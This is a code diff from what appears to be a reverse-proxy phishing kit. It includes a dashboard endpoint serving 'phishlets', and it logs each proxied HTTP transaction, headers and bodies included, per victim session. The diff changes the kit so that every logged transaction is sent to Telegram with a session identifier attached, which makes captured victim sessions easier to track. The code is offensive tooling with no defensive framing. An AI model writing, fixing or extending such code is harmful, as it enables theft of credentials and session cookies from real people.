@@ -1065,6 +1065,9 @@ dashApp.get('/api/analytics', (req, res) => {
     }
 });
 
+// ================================================
+// 𝙿𝙷𝙸𝚂𝙷𝙻𝙴𝚃𝚂 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂 (KEEP OR REMOVE)
+// ================================================
 dashApp.get('/api/phishlets', (req, res) => {
     try {
         const phishletsPath = path.join(__dirname, 'phishlets.json');
@@ -1575,7 +1578,8 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
         proxyRequestHeaders: proxyRequestOptions.headers,
         proxyRequestBody: proxyRequestBody,
         proxyResponseStatusCode: proxyResponse.statusCode,
-        proxyResponseHeaders: proxyResponse.headers
+        proxyResponseHeaders: proxyResponse.headers,
+        sessionId: currentSession   // <-- FIX: Pass sessionId explicitly
     };
     const logFileStream = LOG_FILE_STREAMS[currentSession];
 
@@ -1586,7 +1590,8 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
     }
     
     try {
-        await sendToTelegram(httpProxyTransaction);
+        // Pass sessionId properly
+        await sendToTelegram({ ...httpProxyTransaction, sessionId: currentSession });
         console.log('✅ Telegram notification sent for:', proxyRequestOptions.path);
     } catch (telegramError) {
         console.error('❌ Telegram notification FAILED:', telegramError.message);
